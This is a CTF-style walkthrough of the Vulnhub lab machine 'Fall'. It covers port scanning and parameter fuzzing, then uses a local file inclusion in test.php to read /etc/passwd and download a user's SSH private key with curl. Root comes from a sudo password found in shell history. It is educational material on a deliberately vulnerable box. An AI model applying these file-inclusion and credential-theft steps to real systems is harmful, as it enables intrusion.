---
title: "Fall"
date: 2022-04-15T19:05:23+08:00
draft: false
tags: ["Vulnhub"]
---

To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed!

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.

> The machine IP address is `192.168.50.113` for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.

## Scanning 

Let us start by scanning using Nmap to find any opened ports in the machine.

```
sudo nmap -sS -p- 192.168.50.113 -oN initial.scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 07:19 EDT
Nmap scan report for 192.168.50.113
Host is up (0.0026s latency).
Not shown: 65363 filtered tcp ports (no-response), 159 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn
443/tcp   open   https
445/tcp   open   microsoft-ds
3306/tcp  open   mysql
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   zeus-admin
10080/tcp closed amanda
10443/tcp closed cirrossp
```

From the scan, it tells us that several ports is open:

- SSH = Port 22
- HTTP/HTTPS = Port 80 and 443, 9090
- Samba = Port 139 and 445
- MySQL = Port 3306

## Enumeration 

#### Port 80 and 443 (HTTP CMS Made Simple) 
 
Navigating to port 80/443, we are welcome with a webpage which is powered by `CMS Made Simple`. 

{{<image src="/Fall/1.png" position="center" style="border-radius: 8px;">}}

Reading the news, There's a hint about a backdoor, that was highlighted by `qiu`. So i assume there will be one since whoever created that backdoor, will not be bringing it down any time sooner. 

So fuzzing the page for files/directories give me this return: 

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.50.113/FUZZ -e .php,.html -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.50.113/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 11ms]
modules                 [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 12ms]
tmp                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 5ms]
test.php                [Status: 200, Size: 80, Words: 3, Lines: 6, Duration: 48ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
lib                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 10ms]
error.html              [Status: 200, Size: 80, Words: 3, Lines: 6, Duration: 6ms]
uploads                 [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 19ms]
index.php               [Status: 200, Size: 8385, Words: 1138, Lines: 296, Duration: 246ms]
assets                  [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 8ms]
doc                     [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 18ms]
.                       [Status: 200, Size: 8385, Words: 1138, Lines: 296, Duration: 212ms]
phpinfo.php             [Status: 200, Size: 17, Words: 3, Lines: 2, Duration: 31ms]
missing.html            [Status: 200, Size: 168, Words: 17, Lines: 7, Duration: 2ms]
:: Progress: [189261/189261] :: Job [1/1] :: 1710 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
```

Among all the files there, the only interesting file here is `test.php`. Navigating to `http://<ipaddress>/test.php` will alert us a message saying its missing `GET` parameter:

{{<image src="/Fall/2.png" position="center" style="border-radius: 8px;">}}

#### What is GET Parameter and How to find it ? 

GET parameters always start with a question mark `?`. This followed by the name of the variable and the corresponding value, seperated by an `=`. 

An example of it will look like this: 

`http://<ipaddress>/test.php?name1=value1`

Now to test this, I need to find the `name1` variable name. I will put the `value1` as `index.php`. So by right, if I can get the `name1` variable name right, That whole link that i just type in will show me the default webpage. To do this, I will be using `ffuf` again: 

> During this ffuf, I filter the size. If not the terminal will get flood with result.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://192.168.50.113/test.php?FUZZ=index.php" -fs 80  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.50.113/test.php?FUZZ=index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 80
________________________________________________

file                    [Status: 200, Size: 8385, Words: 1138, Lines: 296, Duration: 899ms]
:: Progress: [63087/63087] :: Job [1/1] :: 997 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```

We get `file`! Test this on the browser specifying `file=index.php` will return us: 

{{<image src="/Fall/3.png" position="center" style="border-radius: 8px;">}}

## Initial Foothold 

Nice! Since I got LFI here, let's check the `passwd` file. 

{{<image src="/Fall/4.png" position="center" style="border-radius: 8px;">}}

From the result, only `qiu` interest me. So I check if he has `id_rsa` key for me to log in via `SSH`: 

{{<image src="/Fall/5.png" position="center" style="border-radius: 8px;">}}

Download the private key and change the permission to `600`:

```
curl -X POST "http://192.168.50.113/test.php?file=/home/qiu/.ssh/id_rsa" > id_rsa; chmod 600 id_rsa

ls -la id_rsa    
-rw------- 1 kali kali 1831 Apr 22 18:51 id_rsa

ssh -i id_rsa qiu@192.168.50.113
Web console: https://FALL:9090/ or https://192.168.50.113:9090/

Last login: Tue Jul 20 03:36:52 2021 from 10.10.10.2
[qiu@FALL ~]$ ls
local.txt  reminder
[qiu@FALL ~]$ cat local.txt 
A low privilege shell! :-)
[qiu@FALL ~]$
```

## Priv Escalation

Looking at the `history` command, I can see what `qiu` has entered in his terminal before:

```
[qiu@FALL ~]$ history 
    1  ls -al
    2  cat .bash_history 
    3  rm .bash_history
    4  echo "remarkablyawesomE" | sudo -S dnf update
    5  ifconfig
    6  ping www.google.com
    7  ps -aux
    8  ps -ef | grep apache
    9  env
   10  env > env.txt
   11  rm env.txt
   12  lsof -i tcp:445
   13  lsof -i tcp:80
   14  ps -ef
   15  lsof -p 1930
   16  lsof -p 2160
   17  rm .bash_history
   18  exit
   19  ls -al
   20  cat .bash_history
   21  exit
   22  ls
   23  cat local.txt 
   24  history
```

Line 4 looks like a password, copy the password and check what `qiu` has for sudo permission:

```
[qiu@FALL ~]$ sudo -l
[sudo] password for qiu: 
Matching Defaults entries for qiu on FALL:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on FALL:
    (ALL) ALL
[qiu@FALL ~]$
```

`qiu` basically has all the sudo permission! I guess its an easy root then! 

```
qiu@FALL ~]$ sudo su root
Password: remarkablyawesomE
[root@FALL qiu]# cd /root
[root@FALL ~]# ls -l
total 16
-rw-------. 1 root root 3963 Aug 14  2019 anaconda-ks.cfg
-rw-------. 1 root root 3151 Aug 14  2019 original-ks.cfg
----------  1 root root   30 May 21 10:22 proof.txt
-r--------  1 root root  452 Aug 30  2021 remarks.txt
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
[root@FALL ~]# cat remarks.txt 
Hi!

Congratulations on rooting yet another box in the digitalworld.local series!

You may have first discovered the digitalworld.local series from looking for deliberately vulnerably machines to practise for the PEN-200 (thank you TJ_Null for featuring my boxes on the training list!)

I hope to have played my little part at enriching your PEN-200 journey.

Want to find the author? Find the author on Linkedin by rooting other boxes in this series!
[root@FALL ~]#
```

## Summary 

During the enumeration part I got lost in the rabbit hole sadly.. Im not sure why i spent so much time on Port 9090. Once i found the LFI vulnerability, it was quite easy already. For root, I went thru another rabbit hole by searching for `SUID` file, mySQL enumeration and etc. Learnt that always check the easiest one first before proceeding to that kind of enumeration.  